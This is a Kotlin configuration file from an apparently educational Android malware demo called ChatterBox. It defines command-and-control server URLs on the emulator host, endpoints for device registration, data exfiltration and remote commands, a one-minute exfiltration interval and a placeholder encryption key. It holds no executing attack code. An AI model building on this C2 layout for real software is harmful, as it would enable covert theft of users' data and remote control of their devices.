package com.example.ChatterBox.malicious

/**
 * Configuration for the Command and Control (C2) server.
 * This class contains global variables for C2 server settings.
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
object C2Config {
    /**
     * The base URL of the C2 server including protocol, IP/hostname and port.
     * Using 10.0.2.2 which is the special IP that allows the emulator to reach the host machine's localhost.
     */
    const val SERVER_URL = "http://10.0.2.2:42069"
    
    /**
     * Alternative HTTP URL to try if HTTPS fails
     */
    const val HTTP_SERVER_URL = "http://10.0.2.2:42069"
    
    /**
     * Local testing URL (when using local network or direct connection)
     */
    const val LOCAL_SERVER_URL = "http://10.0.2.2:42069"
    
    /**
     * Emulator specific URL (10.0.2.2 is the special IP that allows the emulator to connect to the host machine)
     */
    const val EMULATOR_SERVER_URL = "http://10.0.2.2:42069"
    
    /**
     * Additional fallback URLs for testing - These will be tried if the primary URLs fail
     * You can modify these to match your specific network configuration
     */
    /**
     * Endpoints for various C2 server functionalities
     */
    const val REGISTRATION_ENDPOINT = "$SERVER_URL/register"
    const val EXFILTRATION_ENDPOINT = "$SERVER_URL/exfil"
    const val COMMAND_ENDPOINT = "$SERVER_URL/command"
    
    /**
     * HTTP Endpoints for fallback
     */
    const val HTTP_REGISTRATION_ENDPOINT = "$HTTP_SERVER_URL/register"
    const val HTTP_EXFILTRATION_ENDPOINT = "$HTTP_SERVER_URL/exfil"
    const val HTTP_COMMAND_ENDPOINT = "$HTTP_SERVER_URL/command"
    
    /**
     * Configuration parameters for exfiltration
     */
    const val EXFIL_INTERVAL = 60 * 1000L  // 1 minute
    
    /**
     * Encryption settings
     * Note: In a real application, these would not be hardcoded
     */
    const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
}
